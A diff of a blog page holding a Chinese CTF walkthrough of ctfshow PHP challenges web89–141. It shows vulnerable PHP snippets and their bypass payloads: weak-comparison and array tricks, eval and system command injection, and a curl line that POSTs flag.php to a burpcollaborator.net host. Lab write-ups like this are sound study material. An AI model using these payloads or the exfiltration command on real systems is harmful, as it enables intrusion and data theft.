@@ -6,15 +6,13 @@
     <meta charset="utf-8">
     <meta name="keywords" content="ctfshow-php新特性, 学习记录">
     <meta name="description" content="
-
 我要刷完ctfshow
-
 
 [TOC]
 web89-数组绕过preg_matchinclude(&amp;quot;flag.php&amp;quot;);
 highlight_file(__FILE__);
 
-if(isset($_GET[&amp;#39;">
+if(isset($_GET[&amp;#39;nu">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -500,10 +498,8 @@ if(isset($_GET[&amp;#39;">
         <div class="card-content article-card-content">
             <div id="articleContent">
                 <!--toc-->
-
 <p>我要刷完ctfshow</p>
 <span id="more"></span>
-
 <p>[TOC]</p>
 <h3 id="web89-数组绕过preg_match"><a href="#web89-数组绕过preg-match" class="headerlink" title="web89-数组绕过preg_match"></a>web89-数组绕过preg_match</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php">include(&quot;flag.php&quot;);
 highlight_file(__FILE__);
@@ -517,10 +513,8 @@ if(isset($_GET[&#39;num&#39;]))&#123;
         echo $flag;
     &#125;
 &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
 <p>原理是<code>preg_match</code>发生错误会返回false，而我们传入数组可以让其发生错误，这样就可以绕过第一个if判断。而intval函数对非空的数组参数返回1，于是传参：</p>
 <pre class="line-numbers language-php" data-language="php"><code class="language-php">?num[]&#x3D;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
 <p><img src="/images/image-20220929111305975.png" alt="第一题"></p>
 <h3 id="web90-编码绕过"><a href="#web90-编码绕过" class="headerlink" title="web90-编码绕过"></a>web90-编码绕过</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php">include(&quot;flag.php&quot;);
 highlight_file(__FILE__);
@@ -535,7 +529,6 @@ if(isset($_GET[&#39;num&#39;]))&#123;
         echo intval($num,0);
     &#125;
 &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
 <p>intval第二个选项是0，会转成十进制，所以传参4476的十六进制或者八进制形式即可。或者也可以利用intval函数遇见字母停止的特性传参<code>4476a</code>啥的。需要知道的一点是get和post传参都是字符串类型的。</p>
 <p><img src="/images/image-20220929111453316.png" alt="第二关"></p>
 <h3 id="web91-考察正则匹配函数选项的含义"><a href="#web91-考察正则匹配函数选项的含义" class="headerlink" title="web91-考察正则匹配函数选项的含义"></a>web91-考察正则匹配函数选项的含义</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php">show_source(__FILE__);
@@ -552,7 +545,6 @@ if(preg_match(&#39;&#x2F;^php$&#x2F;im&#39;, $a))&#123;
 else&#123;
     echo &#39;nonononono&#39;;
 &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
 <p>第一个正则函数有m选项，所以支持多行匹配。而且多行中只要有一行匹配成功则返回真，于是可以传换行符绕过，记得url编码！</p>
 <p><img src="/images/image-20220929112240381.png" alt="image-20220929112240381"></p>
 <p><img src="/images/image-20220929112252419.png" alt="image-20220929112252419"></p>
@@ -563,9 +555,6 @@ php&#39;
  
 经过第一个匹配时，以换行符为分割也就是%0a，前面因为是空的，所以只匹配换行符后面的，所以可以通过。
 经过第二个正则表达式时，因为我们是%0aphp 不符合正则表达式的以php开头以php结尾。所以无法通过，最后输出flag<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-
-
 <h3 id="web92-编码绕过"><a href="#web92-编码绕过" class="headerlink" title="web92-编码绕过"></a>web92-编码绕过</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php">include(&quot;flag.php&quot;);
 highlight_file(__FILE__);
 if(isset($_GET[&#39;num&#39;]))&#123;
@@ -579,11 +568,9 @@ if(isset($_GET[&#39;num&#39;]))&#123;
         echo intval($num,0);
     &#125;
 &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
 <p><strong>用4476a是无法绕过第六行的，弱比较下两者直接相等</strong></p>
 <pre class="line-numbers language-none"><code class="language-none">payload：?num&#x3D;4476.1（小数点位只要不是0就行）
 因为是弱比较，4476&#x3D;&#x3D;‘4476.0’是正确的，4476&#x3D;&#x3D;‘4476.1’是错误的<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-
 <p><img src="/images/image-20220929112321585.png" alt="web93"></p>
 <h3 id="web93-八进制与小数点绕过"><a href="#web93-八进制与小数点绕过" class="headerlink" title="web93-八进制与小数点绕过"></a>web93-八进制与小数点绕过</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php">include(&quot;flag.php&quot;);
 highlight_file(__FILE__);
@@ -601,12 +588,8 @@ if(isset($_GET[&#39;num&#39;]))&#123;
         echo intval($num,0);
     &#125;
 &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
 <p>利用小数点绕过或者八进制编码</p>
 <pre class="line-numbers language-php" data-language="php"><code class="language-php">?num&#x3D;4476.1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-
-
 <h3 id="web94-nothing-to-say"><a href="#web94-nothing-to-say" class="headerlink" title="web94-nothing to say"></a>web94-nothing to say</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php">include(&quot;flag.php&quot;);
 highlight_file(__FILE__);
 if(isset($_GET[&#39;num&#39;]))&#123;
@@ -624,12 +607,8 @@ if(isset($_GET[&#39;num&#39;]))&#123;
         echo $flag;
     &#125;
 &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
 <p>没什么好说的</p>
 <pre class="line-numbers language-php" data-language="php"><code class="language-php">?num&#x3D;4476.10<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-
-
 <h3 id="web95"><a href="#web95" class="headerlink" title="web95"></a>web95</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php">include(&quot;flag.php&quot;);
 highlight_file(__FILE__);
 if(isset($_GET[&#39;num&#39;]))&#123;
@@ -647,7 +626,6 @@ if(isset($_GET[&#39;num&#39;]))&#123;
         echo $flag;
     &#125;
 &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
 <p>可以使用换行或者空格或者+号，再加上八进制来绕过。</p>
 <pre class="line-numbers language-php" data-language="php"><code class="language-php">payload：
     ?num&#x3D; 010574 &#x2F;&#x2F;注意有空格
@@ -656,7 +634,6 @@ if(isset($_GET[&#39;num&#39;]))&#123;
     ?num&#x3D;+010574
     ?num&#x3D;%09010574
     ?num&#x3D;%2b010574<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
 <h3 id="web96-highlight_file函数的小知识"><a href="#web96-highlight-file函数的小知识" class="headerlink" title="web96-highlight_file函数的小知识"></a>web96-highlight_file函数的小知识</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php
 highlight_file(__FILE__);
 if(isset($_GET[&#39;u&#39;]))&#123;
@@ -666,9 +643,8 @@ if(isset($_GET[&#39;u&#39;]))&#123;
         highlight_file($_GET[&#39;u&#39;]);
     &#125;
 &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
 <p>题目的意思是让我们显示flag.php的源码，但是它不让我们直接输入flag.php。一个简单的绕过方法是输入<code>./flag.php</code>，这表示当前目录下的flag.php文件。</p>
-<p>其他的方法是通过报错的信息得到flag.php的绝对路径是&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php，当然最有趣的知识是<code>highlight_file</code>函数居然也支持php伪协议读取文件。</p>
+<p>其他的方法是通过报错的信息得到flag.php的绝对路径是/var/www/html/flag.php，当然最有趣的知识是<code>highlight_file</code>函数居然也支持php伪协议读取文件。</p>
 <h3 id="web97-php的md5函数漏洞"><a href="#web97-php的md5函数漏洞" class="headerlink" title="web97-php的md5函数漏洞"></a>web97-php的md5函数漏洞</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php
 include(&quot;flag.php&quot;);
 highlight_file(__FILE__);
@@ -680,9 +656,7 @@ else
 print &#39;Wrong.&#39;;
 &#125;
 ?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
 <pre class="line-numbers language-none"><code class="language-none">a[]&#x3D;1&amp;b[]&#x3D;2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
 <p>利用php中md5函数传入数组参数时返回Null的弱点即可拿到flag。更多相关知识看这里：<a target="_blank" rel="noopener" href="https://blog.csdn.net/wy_97/article/details/79088218">https://blog.csdn.net/wy_97/article/details/79088218</a></p>
 <h3 id="web98-简单逻辑"><a href="#web98-简单逻辑" class="headerlink" title="web98-简单逻辑"></a>web98-简单逻辑</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php
 include(&quot;flag.php&quot;);
@@ -692,7 +666,6 @@ $_GET[&#39;flag&#39;]&#x3D;&#x3D;&#39;flag&#39;?$_GET&#x3D;&amp;$_SERVER:&#39;fl
 highlight_file($_GET[&#39;HTTP_FLAG&#39;]&#x3D;&#x3D;&#39;flag&#39;?$flag:__FILE__);
 
 ?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
 <p>梳理一下题目逻辑发现只需要关注第一行和第三行即可：</p>
 <p><img src="/images/image-20220929201456686.png" alt="web98"></p>
 <p><img src="/images/image-20220929154034746.png" alt="web98"></p>
@@ -707,12 +680,11 @@ if(isset($_GET[&#39;n&#39;]) &amp;&amp; in_array($_GET[&#39;n&#39;], $allow))&#1
 &#125;
 
 ?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
 <p>做出此题的关键是<code>in_array</code>函数在第三个参数为空的情况下存在弱比较漏洞。这是说若1在数组中，则1.php也会被<code>in_array</code>函数判断在数组中。</p>
 <p>我选了一个50，然后随便请求了几次就成功了。</p>
 <p><img src="/images/image-20220929155236162.png" alt="image-20220929155236162"></p>
 <p><img src="/images/image-20220929155308812.png" alt="image-20220929155308812"></p>
-<h3 id="web100-eval函数串行执行x2f报错抛出异常"><a href="#web100-eval函数串行执行-x2F-报错抛出异常" class="headerlink" title="web100-eval函数串行执行&#x2F;报错抛出异常"></a>web100-eval函数串行执行&#x2F;报错抛出异常</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php
+<h3 id="web100-eval函数串行执行报错抛出异常"><a href="#web100-eval函数串行执行-报错抛出异常" class="headerlink" title="web100-eval函数串行执行/报错抛出异常"></a>web100-eval函数串行执行/报错抛出异常</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php
 highlight_file(__FILE__);
 include(&quot;ctfshow.php&quot;);
 &#x2F;&#x2F;flag in class ctfshow;
@@ -730,9 +702,8 @@ if($v0)&#123;
 &#125;
 ?&gt;
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>这里考察了&#x3D;和and的优先级，&amp;&amp; &gt; || &gt; &#x3D; &gt; and &gt; or，所以这里是先将is_numeric($v1)的值赋值给变量v0，之后再与后面的进行运算。下面的两个if判断要求v2不能有分号，v3必须要有分号；这一步是很简单的。但是值得注意的一个点就是我们传给eval函数的字符串，其会串行执行，如果中途遇见报错则会停止。所以我们可以直接<code>system(&quot;tac ctfshow.php&quot;)</code>，这样eval会在执行了该命令后由于紧接着的(‘ctfshow’)而报错并抛出异常。<code>payload：?v1=1&amp;v2=system(&#39;tac ctfshow.php&#39;)&amp;v3=;</code></p>
-<p>第二种方法可以利用php的反射类知识：<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/class.reflectionclass.php%EF%BC%8C%E8%BF%99%E5%BA%94%E8%AF%A5%E4%B9%9F%E6%98%AF%E9%A2%98%E7%9B%AE%E7%9A%84%E9%A2%84%E6%9C%9F%E5%81%9A%E6%B3%95%E3%80%82">https://www.php.net/manual/zh/class.reflectionclass.php，这应该也是题目的预期做法。</a></p>
+<p>这里考察了=和and的优先级，&amp;&amp; &gt; || &gt; = &gt; and &gt; or，所以这里是先将is_numeric($v1)的值赋值给变量v0，之后再与后面的进行运算。下面的两个if判断要求v2不能有分号，v3必须要有分号；这一步是很简单的。但是值得注意的一个点就是我们传给eval函数的字符串，其会串行执行，如果中途遇见报错则会停止。所以我们可以直接<code>system(&quot;tac ctfshow.php&quot;)</code>，这样eval会在执行了该命令后由于紧接着的(‘ctfshow’)而报错并抛出异常。<code>payload：?v1=1&amp;v2=system(&#39;tac ctfshow.php&#39;)&amp;v3=;</code></p>
+<p>第二种方法可以利用php的反射类知识：<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/class.reflectionclass.php，这应该也是题目的预期做法。">https://www.php.net/manual/zh/class.reflectionclass.php，这应该也是题目的预期做法。</a></p>
 <p><img src="/images/image-20220929203239214.png" alt="image-20220929203239214"></p>
 <p><code>payload：?v1=1&amp;v2=echo new ReflectionClass&amp;v3=;</code></p>
 <p>这样eval函数的参数就为：<code>eval(echo new ReflectionClass(&#39;ctfshow&#39;);)</code></p>
@@ -757,9 +728,6 @@ if($v0)&#123;
 &#125;
 
 ?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-
-
 <h3 id="web102"><a href="#web102" class="headerlink" title="web102"></a>web102</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php
 highlight_file(__FILE__);
 $v1 &#x3D; $_POST[&#39;v1&#39;];
@@ -777,7 +745,6 @@ else&#123;
 &#125;
 
 ?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
 <p>首先还是观察到运算符优先级的问题，由于赋值运算符的优先级高于and，所以这里是先将<code>is_numeric</code>的结果赋值给v4再进行and运算。那么我们的v2必须要是一个数字或者数字字符串了。值得说明的是使用科学计数法的数字字符串<code>is_numeric</code>会返回真。</p>
 <p><img src="/images/image-20220929222625852.png" alt="image-20220929222625852"></p>
 <p><code>call_user_func</code>函数：</p>
@@ -789,7 +756,7 @@ else&#123;
 <p><img src="/images/image-20220929224056516.png" alt="image-20220929224056516"></p>
 <p>hex2bin同理</p>
 <p><img src="/images/image-20220929224142416.png" alt="image-20220929224142416"></p>
-<p>掌握以上知识之后，我们开始解题。思路是利用题目给的<code>file_put_contents</code>结合php:&#x2F;&#x2F;filter&#x2F;write&#x3D;convert.base64-decode&#x2F;resource&#x3D;1.php结合二进制形式的str注入恶意脚本。是的没有错，base64-decode接受二进制形式参数。</p>
+<p>掌握以上知识之后，我们开始解题。思路是利用题目给的<code>file_put_contents</code>结合php://filter/write=convert.base64-decode/resource=1.php结合二进制形式的str注入恶意脚本。是的没有错，base64-decode接受二进制形式参数。</p>
 <h3 id="web103"><a href="#web103" class="headerlink" title="web103"></a>web103</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php
 highlight_file(__FILE__);
 $v1 &#x3D; $_POST[&#39;v1&#39;];
@@ -812,7 +779,6 @@ else&#123;
 &#125;
 
 ?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
 <p>这一关和102相同。</p>
 <h3 id="web104"><a href="#web104" class="headerlink" title="web104"></a>web104</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php
 highlight_file(__FILE__);
@@ -826,17 +792,11 @@ if(isset($_POST[&#39;v1&#39;]) &amp;&amp; isset($_GET[&#39;v2&#39;]))&#123;
     &#125;
 &#125;
 ?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
 <p>1、sha1函数对数组参数返回Null，所以我们传入两个数组就可以得到两个Null，这肯定是相等的，从而我们就可以得到flag。</p>
 <p>2、或者我们可以直接寻找sha1值相等但是本身不相等的原象。</p>
 <p>3、因为题目没有限制v1和v2不能相等，所以可以直接传入两个相等的值</p>
 <p><img src="/images/image-20221001094908187.png" alt="image-20221001094908187"></p>
 <pre class="line-numbers language-none"><code class="language-none">aaroZmOk   aaK1STfY   aaO8zKZF   aa3OFF9m<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-
-
-
-
 <h3 id="web105-变量覆盖-php的die函数"><a href="#web105-变量覆盖-php的die函数" class="headerlink" title="web105-变量覆盖-php的die函数"></a>web105-变量覆盖-php的die函数</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php
 highlight_file(__FILE__);
 include(&#39;flag.php&#39;);
@@ -861,7 +821,6 @@ echo &quot;your are good&quot;.$flag.&quot;\n&quot;;
 die($suces);
 
 ?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
 <p>get参数名不能是error，post参数值不能是flag。我们可以进行变量覆盖，将flag的值覆盖到error变量上即可，最后通过die函数输出flag！</p>
 <p><img src="/images/image-20221001145200230.png" alt="image-20221001145200230"></p>
 <h3 id="web106"><a href="#web106" class="headerlink" title="web106"></a>web106</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php
@@ -876,7 +835,6 @@ if(isset($_POST[&#39;v1&#39;]) &amp;&amp; isset($_GET[&#39;v2&#39;]))&#123;
     &#125;
 &#125;
 ?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
 <p>这一关加上了v1和v2不能相等的限制，我们可以传入数组形式的参数（报错了…）或者传入两个不相等但是sha1值相等的字符串。</p>
 <p><img src="/images/image-20221001145557736.png" alt="image-20221001145557736"></p>
 <h3 id="web107"><a href="#web107" class="headerlink" title="web107"></a>web107</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php
@@ -896,9 +854,6 @@ if(isset($_POST[&#39;v1&#39;]))&#123;
 
 
 ?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-
-
 <p>两种做法：</p>
 <p>1、<img src="/images/image-20221001152554015.png" alt="image-20221001152554015"></p>
 <p>2、<img src="/images/image-20221001152618491.png" alt="image-20221001152618491"></p>
@@ -928,9 +883,6 @@ if(intval(strrev($_GET[&#39;c&#39;]))&#x3D;&#x3D;0x36d)&#123;
 &#125;
 
 ?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-
-
 <p>ereg是一个很老的函数了，自php5.3后弃用，可以通过%00截断绕过这个函数的匹配。</p>
 <p><img src="/images/image-20221001155911859.png" alt="image-20221001155911859"></p>
 <h3 id="web109-php反射类"><a href="#web109-php反射类" class="headerlink" title="web109-php反射类"></a>web109-php反射类</h3><h3 id="web110-php内置类"><a href="#web110-php内置类" class="headerlink" title="web110-php内置类"></a>web110-php内置类</h3><h3 id="web111-全局变量"><a href="#web111-全局变量" class="headerlink" title="web111-全局变量"></a>web111-全局变量</h3><h3 id="web112-php伪协议-压缩流"><a href="#web112-php伪协议-压缩流" class="headerlink" title="web112-php伪协议-压缩流"></a>web112-php伪协议-压缩流</h3><p><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/wrappers.compression.php">https://www.php.net/manual/zh/wrappers.compression.php</a></p>
@@ -949,9 +901,6 @@ if($F &#x3D; @$_GET[&#39;F&#39;])&#123;
         die(&quot;6个字母都还不够呀?!&quot;);
     &#125;
 &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-
-
 <p>利用php会将反引号内的字符串当作系统命令来执行的特点。</p>
 <pre class="line-numbers language-php" data-language="php"><code class="language-php">$_GET[&#39;F&#39;]&#x3D;&#96;$F&#96; ;ls;
 eval(substr($F,0,6))&#x3D;eval(&#96;$F&#96; ;)
@@ -960,7 +909,6 @@ $F&#x3D;$_GET[&#39;F&#39;]&#x3D;&#96;$F&#96; ;ls;
  eval(&#96;$F&#96; ;)&#x3D; eval(&#96;&#96;$F&#96; ;ls;&#96;)
  可以利用sleep函数验证
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
 <p>以上代码可以执行 ls 命令，但是不回显，所以通过 curl 命令发起 http 请求将文件内容外带起来</p>
 <pre class="line-numbers language-none"><code class="language-none">payload:
 ?F&#x3D;&#96;$F &#96;;+curl -X POST -F xx&#x3D;@flag.php 6hokugw3tjr8vdj8f2yldiead1jt7i.burpcollaborator.net
@@ -969,7 +917,6 @@ $F&#x3D;$_GET[&#39;F&#39;]&#x3D;&#96;$F&#96; ;ls;
 # 其中-F 是带文件的形式发送post请求
 # xx是上传文件的name值，flag.php就是上传的文件 
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
 <p>具体可以看这篇文章：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_46091464/article/details/109095382">(6条消息) ctfshow web133和其他命令执行的骚操作_Firebasky的博客-CSDN博客</a></p>
 <h3 id="web134"><a href="#web134" class="headerlink" title="web134"></a>web134</h3><p>结合题目的逻辑 应用 php 的 parse_str 和 extract 函数</p>
 <h3 id="web136"><a href="#web136" class="headerlink" title="web136"></a>web136</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php
@@ -988,13 +935,9 @@ else&#123;
     highlight_file(__FILE__);
 &#125;
 ?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
 <p><code>exec</code> 返回命令执行结果的最后一行内容，所以无法获取到命令的输出内容。那么我们的思路肯定是想执行某个命令并且让这个命令的执行结果写入到文件中，然后我们再去访问文件。</p>
-<p>在linux中恰好有这么一个命令— <code>tee</code> ，该命令不仅会将命令执行结果自动发送到标准输出，同时还支持将结果写入到文件中。<a target="_blank" rel="noopener" href="https://blog.csdn.net/jjlovefj/article/details/83176871">(6条消息) 【Linux】tee命令_小姜dot的博客-CSDN博客_sudo tee</a></p>
+<p>在linux中恰好有这么一个命令—- <code>tee</code> ，该命令不仅会将命令执行结果自动发送到标准输出，同时还支持将结果写入到文件中。<a target="_blank" rel="noopener" href="https://blog.csdn.net/jjlovefj/article/details/83176871">(6条消息) 【Linux】tee命令_小姜dot的博客-CSDN博客_sudo tee</a></p>
 <pre class="line-numbers language-none"><code class="language-none">ls &#x2F; | tee 1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-
-
 <h3 id="web137-通过类作用域符在不实例化类的情况下直接调用类中静态方法"><a href="#web137-通过类作用域符在不实例化类的情况下直接调用类中静态方法" class="headerlink" title="web137-通过类作用域符在不实例化类的情况下直接调用类中静态方法"></a>web137-通过类作用域符在不实例化类的情况下直接调用类中静态方法</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php
 error_reporting(0);
 highlight_file(__FILE__);
@@ -1011,12 +954,8 @@ class ctfshow
 
 
 call_user_func($_POST[&#39;ctfshow&#39;]);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
 <p>想法肯定是反序列化触发 ctfshow 类的 getFlag 方法，但是现在代码并没有反序列化操作。注意到 getFlag 是一个静态方法， 所以我们可以在不实例化该类的情况下直接通过作用域符调用 getFlag 方法。</p>
 <pre class="line-numbers language-none"><code class="language-none">ctfshow&#x3D;ctfshow::getFlag #函数名后不要加括号<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-
-
 <h3 id="web138-以数组形式调用-call_user_func"><a href="#web138-以数组形式调用-call-user-func" class="headerlink" title="web138-以数组形式调用 call_user_func"></a>web138-以数组形式调用 call_user_func</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php
 
 error_reporting(0);
@@ -1036,8 +975,7 @@ if(strripos($_POST[&#39;ctfshow&#39;], &quot;:&quot;)&gt;-1)&#123;
 &#125;
 
 call_user_func($_POST[&#39;ctfshow&#39;]);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p><img src="/images/ctfshow-php%E6%96%B0%E7%89%B9%E6%80%A7/image-20221214122740953.png" alt="image-20221214122740953"></p>
+<p><img src="/images/ctfshow-php新特性/image-20221214122740953.png" alt="image-20221214122740953"></p>
 <h3 id="web139"><a href="#web139" class="headerlink" title="web139"></a>web139</h3><pre class="line-numbers language-none"><code class="language-none">&lt;?php
 error_reporting(0);
 function check($x)&#123;
@@ -1054,10 +992,7 @@ else&#123;
     highlight_file(__FILE__);
 &#125;
 ?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-
-
-<h3 id="web140-php-x3dx3d-弱比较结合intval会将字符串转为0"><a href="#web140-php-x3D-x3D-弱比较结合intval会将字符串转为0" class="headerlink" title="web140-php &#x3D;&#x3D; 弱比较结合intval会将字符串转为0"></a>web140-php &#x3D;&#x3D; 弱比较结合intval会将字符串转为0</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php
+<h3 id="web140-php-弱比较结合intval会将字符串转为0"><a href="#web140-php-弱比较结合intval会将字符串转为0" class="headerlink" title="web140-php == 弱比较结合intval会将字符串转为0"></a>web140-php == 弱比较结合intval会将字符串转为0</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php
 error_reporting(0);
 highlight_file(__FILE__);
 if(isset($_POST[&#39;f1&#39;]) &amp;&amp; isset($_POST[&#39;f2&#39;]))&#123;
@@ -1074,7 +1009,6 @@ if(isset($_POST[&#39;f1&#39;]) &amp;&amp; isset($_POST[&#39;f2&#39;]))&#123;
 &#125;
 
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
 <p>只需要让 $code 是一个字符串即可。</p>
 <pre class="line-numbers language-none"><code class="language-none">md5(phpinfo())
 md5(sleep())
@@ -1082,9 +1016,6 @@ md5(md5())
 current(localeconv)
 sha1(getcwd())     因为&#x2F;var&#x2F;www&#x2F;html md5后开头的数字所以我们改用sha1
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-
-
 <h3 id="web141-取反无字母数字结合在命令前添加数字仍可继续执行命令"><a href="#web141-取反无字母数字结合在命令前添加数字仍可继续执行命令" class="headerlink" title="web141-取反无字母数字结合在命令前添加数字仍可继续执行命令"></a>web141-取反无字母数字结合在命令前添加数字仍可继续执行命令</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php
 
 #error_reporting(0);
@@ -1102,12 +1033,11 @@ if(isset($_GET[&#39;v1&#39;]) &amp;&amp; isset($_GET[&#39;v2&#39;]) &amp;&amp; i
     &#125;
 &#125;
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
 <p>注意 <code>\W</code> 表示匹配任何非单词字符，也就是不能有字母和数字。所以本题实际上是一个无字母数字的RCE。可以用取反！</p>
